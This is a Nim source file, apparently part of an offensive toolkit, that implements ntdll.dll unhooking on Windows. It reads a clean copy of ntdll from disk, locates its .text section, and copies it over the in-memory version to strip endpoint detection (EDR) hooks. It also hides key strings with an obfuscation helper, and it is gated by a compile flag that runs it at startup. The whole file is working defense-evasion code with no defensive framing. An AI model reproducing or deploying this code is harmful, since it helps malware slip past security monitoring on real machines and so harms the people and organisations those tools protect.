## ntdll unhooking - remaps the .text section of ntdll.dll from a clean
## on-disk copy over the in-memory version hooked by EDR userland callbacks.
## After this runs, NT syscall wrappers execute the original Microsoft code,
## not the EDR's interceptor stubs.
## Compile with -d:unhookNtdll to enable at startup.
import crypto/strenc

when defined(windows):
  type
    HANDLE  = int
    DWORD   = uint32
    SIZE_T  = uint
    BOOL    = int32
    LPVOID  = pointer

  const
    GENERIC_READ          = DWORD(0x80000000)
    FILE_SHARE_READ       = DWORD(0x00000001)
    OPEN_EXISTING         = DWORD(3)
    PAGE_READONLY         = DWORD(0x02)
    PAGE_EXECUTE_READWRITE = DWORD(0x40)
    PAGE_EXECUTE_READ     = DWORD(0x20)
    FILE_MAP_READ         = DWORD(0x04)
    INVALID_HANDLE_VALUE  = HANDLE(-1)

  proc GetModuleHandleA(n: cstring): HANDLE
    {.importc: "GetModuleHandleA", dynlib: "kernel32".}
  proc CreateFileA(n: cstring, da: DWORD, sm: DWORD, sa: pointer,
                   cd: DWORD, fa: DWORD, tm: HANDLE): HANDLE
    {.importc: "CreateFileA", dynlib: "kernel32".}
  proc CreateFileMappingA(h: HANDLE, sa: pointer, prot: DWORD,
                           maxH: DWORD, maxL: DWORD, n: cstring): HANDLE
    {.importc: "CreateFileMappingA", dynlib: "kernel32".}
  proc MapViewOfFile(h: HANDLE, acc: DWORD, offH: DWORD,
                     offL: DWORD, sz: SIZE_T): LPVOID
    {.importc: "MapViewOfFile", dynlib: "kernel32".}
  proc UnmapViewOfFile(p: LPVOID): BOOL
    {.importc: "UnmapViewOfFile", dynlib: "kernel32".}
  proc CloseHandle(h: HANDLE): BOOL
    {.importc: "CloseHandle", dynlib: "kernel32".}
  proc VirtualProtect(a: LPVOID, sz: SIZE_T, prot: DWORD, old: ptr DWORD): BOOL
    {.importc: "VirtualProtect", dynlib: "kernel32".}

  type TextSec = object
    rva, size, fileOff: int

  proc findTextSection(base: int): TextSec =
    result = TextSec(rva: 0, size: 0, fileOff: 0)
    # Validate MZ
    if cast[ptr uint16](base)[] != 0x5A4D'u16: return
    let e_lfanew = int(cast[ptr uint32](base + 0x3C)[])
    let ntBase   = base + e_lfanew
    # Validate PE\0\0
    if cast[ptr uint32](ntBase)[] != 0x00004550'u32: return
    let nSec        = int(cast[ptr uint16](ntBase + 6)[])
    let sizeOptHdr  = int(cast[ptr uint16](ntBase + 20)[])
    if nSec == 0 or nSec > 96: return
    let firstSec = ntBase + 24 + sizeOptHdr
    for i in 0 ..< nSec:
      let sec  = firstSec + i * 40
      let name = cast[ptr array[8, uint8]](sec)[]
      # ".text" = 2E 74 65 78 74
      if name[0] == 0x2E and name[1] == 0x74 and name[2] == 0x65 and
         name[3] == 0x78 and name[4] == 0x74:
        result.rva     = int(cast[ptr uint32](sec + 12)[])
        result.size    = int(cast[ptr uint32](sec + 8)[])
        result.fileOff = int(cast[ptr uint32](sec + 20)[])
        return

  proc unhookNtdll*(): bool =
    let ntdllBase = GetModuleHandleA(hidstr("ntdll.dll").cstring)
    if ntdllBase == 0: return false

    let path  = hidstr("C:\\Windows\\System32\\ntdll.dll")
    let hFile = CreateFileA(path.cstring, GENERIC_READ, FILE_SHARE_READ,
                            nil, OPEN_EXISTING, DWORD(0), 0)
    if hFile == INVALID_HANDLE_VALUE: return false
    defer: discard CloseHandle(hFile)

    let hMap = CreateFileMappingA(hFile, nil, PAGE_READONLY, 0, 0, nil)
    if hMap == 0: return false
    defer: discard CloseHandle(hMap)

    let diskView = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, SIZE_T(0))
    if diskView == nil: return false
    defer: discard UnmapViewOfFile(diskView)

    let memSec  = findTextSection(ntdllBase)
    let diskSec = findTextSection(cast[int](diskView))
    if memSec.size == 0 or diskSec.size == 0: return false

    let sz       = SIZE_T(min(memSec.size, diskSec.size))
    let memText  = cast[LPVOID](ntdllBase + memSec.rva)
    let diskText = cast[pointer](cast[int](diskView) + diskSec.fileOff)

    var oldProt: DWORD = 0
    if VirtualProtect(memText, sz, PAGE_EXECUTE_READWRITE, addr oldProt) == 0:
      return false
    copyMem(memText, diskText, int(sz))
    discard VirtualProtect(memText, sz, PAGE_EXECUTE_READ, addr oldProt)
    return true
